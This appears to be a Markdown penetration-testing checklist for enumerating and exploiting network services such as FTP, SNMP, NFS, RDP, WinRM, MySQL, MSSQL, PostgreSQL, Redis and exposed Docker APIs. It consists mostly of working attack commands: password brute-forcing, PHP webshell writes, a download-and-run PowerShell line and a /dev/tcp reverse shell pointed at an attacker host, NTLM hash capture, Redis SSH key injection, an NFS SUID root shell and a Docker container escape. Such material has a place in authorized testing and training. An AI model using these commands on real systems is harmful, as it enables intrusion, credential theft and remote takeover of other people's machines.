# 🔌 Other Services Enumeration

> **Every open port is a potential attack vector.** This file covers all common services beyond web, DNS, and SMB.

---

## Table of Contents
- [FTP (21)](#ftp-21)
- [SSH (22)](#ssh-22)
- [SMTP (25 / 465 / 587)](#smtp-25--465--587)
- [POP3 / IMAP (110 / 143)](#pop3--imap-110--143)
- [RPCBind (111)](#rpcbind-111)
- [SNMP (161/UDP)](#snmp-161-udp)
- [NFS (2049)](#nfs-2049)
- [RDP (3389)](#rdp-3389)
- [WinRM (5985/5986)](#winrm-59855986)
- [MySQL (3306)](#mysql-3306)
- [MSSQL (1433)](#mssql-1433)
- [PostgreSQL (5432)](#postgresql-5432)
- [MongoDB (27017)](#mongodb-27017)
- [Redis (6379)](#redis-6379)
- [Elasticsearch (9200)](#elasticsearch-9200)
- [VNC (5900+)](#vnc-5900)
- [Memcached (11211)](#memcached-11211)
- [Docker API (2375/2376)](#docker-api-23752376)

---

## FTP (21)

- [ ] **Try anonymous login**:
  ```bash
  ftp $IP
  # Username: anonymous
  # Password: (blank or email)
  
  nmap --script ftp-anon -p 21 $IP
  ```
- [ ] **Banner grab + version**:
  ```bash
  nc $IP 21
  nmap -sV -p 21 --script ftp-syst,ftp-bounce $IP
  ```
- [ ] **FTP vulnerability scan**:
  ```bash
  nmap --script ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p 21 $IP
  ```
- [ ] **Brute force** (if needed):
  ```bash
  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP
  ```
- [ ] **Download all files once logged in**:
  ```ftp
  binary
  prompt OFF
  mget *
  ```
- [ ] **TFTP (UDP 69)**:
  ```bash
  tftp $IP
  get /etc/passwd
  get boot.ini
  ```

> **💡 Tip:** Look for config files, credentials, source code, and backup files in FTP shares.

---

## SSH (22)

- [ ] **Banner grab / version**:
  ```bash
  nc $IP 22
  ssh-keyscan $IP
  nmap -sV -p 22 $IP
  ```
- [ ] **SSH audit** (check for weak algorithms):
  ```bash
  ssh-audit $IP
  ```
- [ ] **User enumeration** (CVE-2018-15473, older OpenSSH):
  ```bash
  python3 ssh_user_enum.py --port 22 --userList users.txt $IP
  ```
- [ ] **Brute force** (last resort — noisy):
  ```bash
  hydra -L users.txt -P passwords.txt ssh://$IP
  ```
- [ ] **Try found private keys**:
  ```bash
  chmod 600 id_rsa
  ssh -i id_rsa <user>@$IP
  ```
- [ ] **Common misconfigurations**:
  - SSH keys in `/home/<user>/.ssh/` (id_rsa, authorized_keys)
  - `authorized_keys` with no restrictions
  - `/etc/ssh/sshd_config` — check for `PermitRootLogin yes`, `PasswordAuthentication yes`

---

## SMTP (25 / 465 / 587)

- [ ] **Banner grab**:
  ```bash
  nc $IP 25
  telnet $IP 25
  ```
- [ ] **User enumeration** (VRFY, EXPN, RCPT TO):
  ```bash
  smtp-user-enum -M VRFY -U users.txt -t $IP
  smtp-user-enum -M RCPT -U users.txt -t $IP -D <domain>
  ```
- [ ] **Nmap scripts**:
  ```bash
  nmap --script smtp-commands,smtp-enum-users,smtp-vuln* -p 25,465,587 $IP
  ```
- [ ] **Send a test email** (test relay):
  ```bash
  telnet $IP 25
  EHLO test
  MAIL FROM:<test@test.com>
  RCPT TO:<admin@<domain>>
  DATA
  Subject: test
  test
  .
  QUIT
  ```
- [ ] **Swaks** (testing email sending):
  ```bash
  swaks --to <target@domain> --from fake@domain --server $IP
  ```

---

## POP3 / IMAP (110 / 143)

- [ ] **Connect and test**:
  ```bash
  # POP3
  nc $IP 110
  telnet $IP 110
  
  # After connecting:
  USER <username>
  PASS <password>
  LIST         # list messages
  RETR 1       # retrieve message 1
  QUIT
  ```
  ```bash
  # IMAP
  nc $IP 143
  # After connecting:
  a LOGIN <user> <pass>
  a LIST "" "*"
  a SELECT INBOX
  a FETCH 1 BODY[]
  a LOGOUT
  ```
- [ ] **Nmap scripts**:
  ```bash
  nmap --script pop3-capabilities,pop3-ntlm-info -p 110 $IP
  nmap --script imap-capabilities,imap-ntlm-info -p 143 $IP
  ```
- [ ] **Brute force**:
  ```bash
  hydra -L users.txt -P passwords.txt pop3://$IP
  hydra -L users.txt -P passwords.txt imap://$IP
  ```

---

## RPCBind (111)

- [ ] **Enumerate RPC services**:
  ```bash
  rpcinfo -p $IP
  rpcinfo -T tcp $IP
  nmap -sV -p 111 --script=rpcinfo $IP
  ```
- [ ] **Look for NFS via RPC**:
  ```bash
  rpcinfo -p $IP | grep -i nfs
  # If mountd/nfs shown → check NFS section below
  ```

---

## SNMP (161/UDP)

- [ ] **Test common community strings**:
  ```bash
  snmpwalk -v2c -c public $IP
  snmpwalk -v2c -c private $IP
  snmpwalk -v2c -c manager $IP
  ```
- [ ] **Brute-force community strings**:
  ```bash
  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP
  ```
- [ ] **Enumerate key OIDs** (once you have the community string):
  ```bash
  # System description
  snmpwalk -v2c -c public $IP 1.3.6.1.2.1.1.1.0
  
  # Running processes
  snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2
  
  # Installed software
  snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2
  
  # Network interfaces
  snmpwalk -v2c -c public $IP 1.3.6.1.2.1.2.2.1.2
  
  # Windows users
  snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25
  
  # TCP connections
  snmpwalk -v2c -c public $IP 1.3.6.1.2.1.6.13.1.3
  ```
- [ ] **snmp-check** (comprehensive enumeration):
  ```bash
  snmp-check $IP -c public
  ```

---

## NFS (2049)

- [ ] **List exports**:
  ```bash
  showmount -e $IP
  nmap -p 2049 --script nfs-showmount $IP
  ```
- [ ] **Detailed NFS info**:
  ```bash
  nmap -p 2049 --script nfs-ls,nfs-statfs,nfs-showmount $IP
  ```
- [ ] **Mount a share**:
  ```bash
  sudo mkdir /mnt/nfs_share
  sudo mount -t nfs $IP:/<share> /mnt/nfs_share
  ls -la /mnt/nfs_share
  ```
- [ ] **Check for no_root_squash** (critical PrivEsc opportunity!):
  ```bash
  cat /etc/exports      # If accessible on target
  # Look for: /share *(rw,no_root_squash)
  ```
- [ ] **Exploit no_root_squash** (create SUID binary):
  ```bash
  # On attacker machine (as root):
  cp /bin/bash /mnt/nfs_share/bash
  chmod +s /mnt/nfs_share/bash
  
  # On target machine:
  /tmp/bash -p       # Get root shell
  ```

---

## RDP (3389)

- [ ] **Check RDP banner / encryption**:
  ```bash
  nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $IP
  ```
- [ ] **Test credentials**:
  ```bash
  xfreerdp /u:<user> /p:<pass> /v:$IP /cert-ignore
  xfreerdp /u:<user> /H:<ntlm_hash> /v:$IP /cert-ignore  # PtH
  rdesktop -u <user> -p <pass> $IP
  ```
- [ ] **Brute force**:
  ```bash
  hydra -L users.txt -P passwords.txt rdp://$IP
  crackmapexec rdp $IP -u <user> -p <pass>
  ```
- [ ] **BlueKeep check (CVE-2019-0708)**:
  ```bash
  nmap --script rdp-vuln-ms12-020 -p 3389 $IP
  ```

---

## WinRM (5985/5986)

- [ ] **Check if WinRM is accessible**:
  ```bash
  crackmapexec winrm $IP -u <user> -p <pass>
  ```
- [ ] **evil-winrm** (interactive shell):
  ```bash
  evil-winrm -i $IP -u <user> -p '<pass>'
  evil-winrm -i $IP -u <user> -H '<ntlm_hash>'   # Pass-the-Hash
  evil-winrm -i $IP -u <user> -p '<pass>' -S      # HTTPS (port 5986)
  
  # Useful evil-winrm features:
  upload <local_file>       # Upload file to target
  download <remote_file>    # Download file
  menu                      # Load .Net assemblies
  Bypass-4MSI               # Bypass AMSI
  ```

> **💡 Tip:** WinRM is often enabled on Windows Servers. If you have valid creds, `evil-winrm` gives you a proper PowerShell session.

---

## MySQL (3306)

- [ ] **Connect**:
  ```bash
  mysql -h $IP -u root -p
  mysql -h $IP -u root       # No password
  mysql -h $IP -u root -p''  # Empty password
  ```
- [ ] **Nmap scan**:
  ```bash
  nmap -sV -p 3306 --script mysql-info,mysql-enum,mysql-databases $IP
  ```
- [ ] **Brute force**:
  ```bash
  hydra -L users.txt -P passwords.txt mysql://$IP
  ```
- [ ] **Once connected — useful queries**:
  ```sql
  show databases;
  use <database>;
  show tables;
  select * from users;
  select user, password from mysql.user;   -- MySQL user credentials
  select @@datadir;                         -- Data directory
  select @@version;
  ```
- [ ] **Read files** (if FILE privilege):
  ```sql
  SELECT LOAD_FILE('/etc/passwd');
  SELECT LOAD_FILE('/var/www/html/config.php');
  ```
- [ ] **Write files** (potential webshell):
  ```sql
  SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
  ```

---

## MSSQL (1433)

- [ ] **Nmap scan**:
  ```bash
  nmap -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password $IP
  ```
- [ ] **Impacket — mssqlclient**:
  ```bash
  python3 mssqlclient.py <domain>/<user>:<pass>@$IP -windows-auth
  python3 mssqlclient.py <user>:<pass>@$IP      # SQL auth
  ```
- [ ] **CrackMapExec MSSQL**:
  ```bash
  crackmapexec mssql $IP -u <user> -p <pass>
  crackmapexec mssql $IP -u <user> -p <pass> -q "SELECT name FROM sys.databases;"
  ```
- [ ] **Enable xp_cmdshell** (code execution):
  ```sql
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
  EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://<attacker>/shell.ps1\")"';
  ```
- [ ] **Read files**:
  ```sql
  EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\root.txt';
  ```
- [ ] **NTLM hash capture** (via UNC path):
  ```sql
  EXEC xp_dirtree '\\<attacker_ip>\share';  -- triggers Responder
  ```

---

## PostgreSQL (5432)

- [ ] **Connect**:
  ```bash
  psql -h $IP -U postgres
  psql -h $IP -U postgres -p 5432
  ```
- [ ] **Nmap**:
  ```bash
  nmap -p 5432 --script pgsql-brute $IP
  ```
- [ ] **Once connected**:
  ```sql
  \l                   -- list databases
  \c <database>        -- connect to DB
  \dt                  -- list tables
  select * from pg_user;
  ```
- [ ] **Copy command for file read/write**:
  ```sql
  COPY test_table FROM '/etc/passwd';
  COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
  ```
- [ ] **RCE via COPY PROGRAM** (PostgreSQL 9.3+):
  ```sql
  COPY test_table FROM PROGRAM 'id';
  CREATE TABLE cmd_output (line text);
  COPY cmd_output FROM PROGRAM 'bash -i >& /dev/tcp/<attacker>/4444 0>&1';
  ```

---

## MongoDB (27017)

- [ ] **Connect** (no auth by default on many installations):
  ```bash
  mongo $IP
  mongo --host $IP --port 27017
  ```
- [ ] **Nmap**:
  ```bash
  nmap -p 27017 --script mongodb-info,mongodb-databases $IP
  ```
- [ ] **Once connected**:
  ```javascript
  show dbs                      // list databases
  use <database>                // switch to DB
  show collections              // list collections (tables)
  db.<collection>.find()        // dump all records
  db.<collection>.find().pretty()
  db.users.find({}, {username:1, password:1})  // specific fields
  ```

---

## Redis (6379)

- [ ] **Connect**:
  ```bash
  redis-cli -h $IP
  redis-cli -h $IP -a <password>   # authenticated
  ```
- [ ] **Banner and info**:
  ```bash
  redis-cli -h $IP info
  ```
- [ ] **List all keys**:
  ```bash
  redis-cli -h $IP keys "*"
  redis-cli -h $IP get <key>
  ```
- [ ] **RCE via web shell** (if web directory is writable):
  ```bash
  redis-cli -h $IP
  config set dir /var/www/html
  config set dbfilename shell.php
  set webshell "<?php system($_GET['cmd']); ?>"
  save
  ```
- [ ] **SSH key injection** (if SSH is running and writable home):
  ```bash
  # Generate key pair
  ssh-keygen -t rsa -f /tmp/redis_key
  
  redis-cli -h $IP flushall
  redis-cli -h $IP set crackit "\n\n$(cat /tmp/redis_key.pub)\n\n"
  redis-cli -h $IP config set dir /home/<user>/.ssh
  redis-cli -h $IP config set dbfilename authorized_keys
  redis-cli -h $IP save
  
  ssh -i /tmp/redis_key <user>@$IP
  ```

---

## Elasticsearch (9200)

- [ ] **Check open API**:
  ```bash
  curl http://$IP:9200/
  curl http://$IP:9200/_cat/indices?v    # list all indices
  curl http://$IP:9200/_cat/nodes?v      # cluster info
  ```
- [ ] **Dump all data from an index**:
  ```bash
  curl http://$IP:9200/<index>/_search?size=100&pretty
  ```
- [ ] **Nmap**:
  ```bash
  nmap -p 9200 --script http-info $IP
  ```

---

## VNC (5900+)

- [ ] **Nmap**:
  ```bash
  nmap -p 5900-5910 --script vnc-info,vnc-brute $IP
  ```
- [ ] **Connect**:
  ```bash
  vncviewer $IP:5900
  vncviewer $IP::5901
  ```
- [ ] **Auth bypass check**:
  ```bash
  nmap -p 5900 --script realvnc-auth-bypass $IP
  ```

---

## Memcached (11211)

- [ ] **Banner + stats**:
  ```bash
  echo "version" | nc $IP 11211
  echo "stats" | nc $IP 11211
  echo "stats items" | nc $IP 11211
  ```
- [ ] **Dump cached items**:
  ```bash
  echo "stats cachedump 1 0" | nc $IP 11211
  echo "get <key>" | nc $IP 11211
  ```

---

## Docker API (2375/2376)

- [ ] **Check exposed Docker API**:
  ```bash
  curl http://$IP:2375/version
  curl http://$IP:2375/containers/json
  curl http://$IP:2375/images/json
  ```
- [ ] **Create privileged container and escape to host**:
  ```bash
  # Create container mounting / to /host
  curl -X POST -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["chroot","/host"],"Privileged":true,"Binds":["/:/host"]}' \
    http://$IP:2375/containers/create
  
  # Start it
  curl -X POST http://$IP:2375/containers/<id>/start
  ```

---

## 🔗 References

- [HackTricks — Network Services](https://book.hacktricks.xyz/network-services-pentesting)
- [HackTricks — Redis RCE](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
- [PayloadsAllTheThings — MSSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)

---

*[← LDAP/AD Enumeration](./05_ldap_ad_enum.md) · [Recon Hub](./README.md) · [Next: Vuln Assessment →](../03_vuln_assessment/README.md)*
